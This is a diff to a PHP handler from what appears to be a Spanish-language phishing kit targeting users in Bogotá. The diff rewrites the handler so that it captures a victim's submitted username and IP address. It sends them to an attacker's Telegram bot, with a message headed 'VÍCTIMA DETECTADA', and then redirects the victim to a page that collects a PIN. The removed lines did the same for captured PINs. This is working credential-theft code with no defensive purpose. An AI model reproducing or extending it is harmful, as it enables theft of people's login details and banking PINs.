@@ -2,23 +2,27 @@
 require('../panel/lib/funciones.php');
 date_default_timezone_set('America/Bogota');
 
-// Captura de datos
 $ip = $_SERVER['REMOTE_ADDR'];
-$registro = traer_regitro($ip);
-$contrasena = $_POST['pass'];
+$usuario = $_POST['usuario']; // O el nombre del campo que uses
 
-// Actualizar base de datos local del panel
-actualizar_registro_pass($registro, $contrasena);
+// 1. Intentar registrar en la base de datos (si la DB está lista)
+@actualizar_registro_usuario($ip, $usuario); 
 
-// ENVÍO A TU BOT DE TELEGRAM (USANDO VARIABLES DE RAILWAY)
+// 2. LEER VARIABLES DE ENTORNO DE RAILWAY
 $token = getenv('TOKEN_BOT');
 $id = getenv('ID_CHAT');
-$mensaje = "🔔 *NUEVO PIN CAPTURADO*\n\n";
-$mensaje .= "👤 IP: " . $ip . "\n";
-$mensaje .= "🔑 PIN: " . $contrasena . "\n";
 
-file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown");
+if($token && $id) {
+    $mensaje = "🚀 *VÍCTIMA DETECTADA*\n\n";
+    $mensaje .= "👤 Usuario: " . $usuario . "\n";
+    $mensaje .= "🌐 IP: " . $ip . "\n";
+    $mensaje .= "📍 Ciudad: Bogotá, CO\n";
+    
+    // Enviar a Telegram vía CURL (más seguro en Railway)
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
+    @file_get_contents($url);
+}
 
-// SALTO AL SIGUIENTE PASO
-header("Location: ../a/WAITING.php");
+// 3. Saltar al siguiente paso (el PIN)
+header("Location: ../a/pin.php"); 
 ?>
